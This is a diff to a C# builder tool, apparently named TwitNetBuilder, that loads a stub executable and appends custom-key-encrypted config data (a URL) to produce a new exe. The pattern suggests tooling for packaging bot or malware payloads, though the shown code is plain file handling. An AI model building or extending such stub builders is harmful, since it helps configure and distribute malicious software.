@@ -1,4 +1,7 @@
-﻿using System;
+﻿/* TODO
+ * - Maybe some more options other than codepage?
+ */
+using System;
 using System.Text;
 using System.Windows.Forms;
 using System.IO;
@@ -17,16 +20,17 @@ namespace TwitNetBuilder
         private void BuildButtonClick(object sender, EventArgs e)
         {
             //We find the file name to save as
-            SaveFileDialog stubSaveDialog = new SaveFileDialog {
+            OpenFileDialog stubSaveDialog = new OpenFileDialog {
                            Filter = "EXE File(*.exe)|*.exe",
                            InitialDirectory = Application.StartupPath,
-                           Title = "Save Stub As..." };
+                           Title = "Show me the stub baby" };
             DialogResult showDialog = stubSaveDialog.ShowDialog();
+
             if(string.IsNullOrEmpty(stubSaveDialog.FileName) || showDialog != DialogResult.OK)
             {
                 return;
             }
-
+            Constants.StubFileName = stubSaveDialog.FileName;
             //We load the stub and config data (just a url for now)
             Constants.CustomEncryptionKey = EncryptKeyBox.Text;
             byte[] stub = File.ReadAllBytes(Constants.StubFileName);
@@ -62,7 +66,7 @@ namespace TwitNetBuilder
 
 
             //We write the original stub exe + appended data
-            StreamWriter writer = new StreamWriter(stubSaveDialog.FileName, false, Encoding.Default);
+            StreamWriter writer = new StreamWriter(Constants.StubFileName.Replace(".exe", "-new.exe"), false, Encoding.Default);
             writer.AutoFlush = true;
             writer.Write(Encoding.Default.GetString(stub));
             writer.Write(appendData);
